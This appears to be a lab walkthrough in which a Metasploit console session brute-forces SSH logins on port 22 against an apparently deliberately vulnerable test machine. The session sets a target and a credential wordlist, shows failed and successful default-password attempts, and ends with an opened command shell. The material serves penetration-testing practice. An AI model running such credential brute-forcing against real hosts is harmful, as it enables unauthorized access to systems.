# Attacking on Port 22

```
[spvreddy@parrot]─[~]
msf > search ssh_login
[!] Module database cache not built yet, using slow search

Matching Modules
================

   Name                                    Disclosure Date  Rank    Description
   ----                                    ---------------  ----    -----------
   auxiliary/scanner/ssh/ssh_login                          normal  SSH Login Check Scanner
   auxiliary/scanner/ssh/ssh_login_pubkey                   normal  SSH Public Key Login Scanner


msf > use auxiliary/scanner/ssh/ssh_login
msf auxiliary(ssh_login) > show options

Module options (auxiliary/scanner/ssh/ssh_login):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   BLANK_PASSWORDS   false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
   DB_ALL_USERS      false            no        Add all users in the current database to the list
   PASSWORD                           no        A specific password to authenticate with
   PASS_FILE                          no        File containing passwords, one per line
   RHOSTS                             yes       The target address range or CIDR identifier
   RPORT             22               yes       The target port
   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
   THREADS           1                yes       The number of concurrent threads
   USERNAME                           no        A specific username to authenticate as
   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false            no        Try the username as the password for all users
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           false            yes       Whether to print output for all attempts

msf auxiliary(ssh_login) > set RHOSTS 192.168.56.101
RHOSTS => 192.168.56.101
msf auxiliary(ssh_login) > set USERPASS_FILE /home/spvreddy/Desktop/spv.xt 
msf auxiliary(ssh_login) > set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/spv.txt
USERPASS_FILE => /usr/share/metasploit-framework/data/wordlists/spv.txt
msf auxiliary(ssh_login) > run
msf auxiliary(ssh_login) > set VERBOSE true
VERBOSE => true
msf auxiliary(ssh_login) > run

[-] 192.168.56.101:22 - Failed: 'root:toor'
[!] No active DB -- Credential data will not be saved!
[-] 192.168.56.101:22 - Failed: 'root:'
[-] 192.168.56.101:22 - Failed: 'root:root'
[-] 192.168.56.101:22 - Failed: 'msfadmin:'
[+] 192.168.56.101:22 - Success: 'msfadmin:msfadmin' 'uid=1000(msfadmin) gid=1000(msfadmin) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),107(fuse),111(lpadmin),112(admin),119(sambashare),1000(msfadmin) Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux '
[*] Command shell session 2 opened (10.0.2.15:35365 -> 192.168.56.101:22) at 2018-05-21 11:26:52 +0000
[-] 192.168.56.101:22 - Failed: 'admin:admin'
pwd
[-] 192.168.56.101:22 - Failed: 'admin:password'
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(ssh_login) > 


```



